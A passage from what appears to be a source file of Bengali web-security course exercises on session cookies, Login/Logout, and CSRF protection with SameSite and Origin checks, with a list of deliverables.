        । কমপক্ষে পাঁচটা ভুল আছে। তারপর ঠিক লাইনটা লিখুন, আর সেটা মোছার লাইনটাও।
      </span>,
      <span key="4">
        <strong>my-tours এ Login আর Logout:</strong> নিজের my-tours এ, সাধারণ Node বা Next.js যেটা
        ব্যবহার করছেন, একটা Login আর Logout বানান, যেটা <code>__Host-session</code> বসায় আর মোছে। মেয়াদ
        আসবে <code>SESSION_TTL_SECONDS</code> থেকে, বদলানোর Request এর অনুমোদিত Origin{" "}
        <code>ALLOWED_ORIGINS</code> থেকে, আর দুইটার একটা না থাকলে App চালুই হবে না। curl এর Jar দিয়ে
        প্রমাণ করুন Login এ Cookie বসে আর Logout এ মোছে। তারপর 127.0.0.1 এর একটা পাতা থেকে একটা জাল Form
        পাঠিয়ে প্রমাণ করুন Request টা ব্যর্থ হয়।
      </span>,
      <span key="5">
        <strong>নিজের ভাষায় শেখান (১০ লাইন):</strong> দলের একজন বললেন, আমাদের Login Cookie তো
        HttpOnly, তাই CSRF নিয়ে চিন্তার কিছু নেই। তাঁকে বোঝান HttpOnly আসলে কী আটকায় আর কী আটকায় না,
        CSRF এ কেন কাউকে Cookie পড়তে হয় না, SameSite কোন অংশটা সামলায়, আর blog.islandtours.example এর
        মতো Subdomain থাকলে কেন Origin যাচাই তখনো লাগে।
      </span>,
    ],
    deliverables: [
      <span key="1">তিন সাইটের Login Cookie এর ছক, মান ছাড়া, প্রতিটার এক লাইনের মত সহ</span>,
      <span key="2">Login থেকে Logout এর ছবি, Blog এর Request সহ</span>,
      <span key="3">খারাপ লাইনের ভুলের তালিকা, ঠিক লাইন আর মোছার লাইন</span>,
      <span key="4">my-tours এর Cookie Code, আর Login, Logout আর জাল Form ব্যর্থ হওয়ার Terminal প্রমাণ</span>,
      <span key="5">দলের সদস্যের জন্য ১০ লাইনের ব্যাখ্যা</span>,
    ],
  },
};
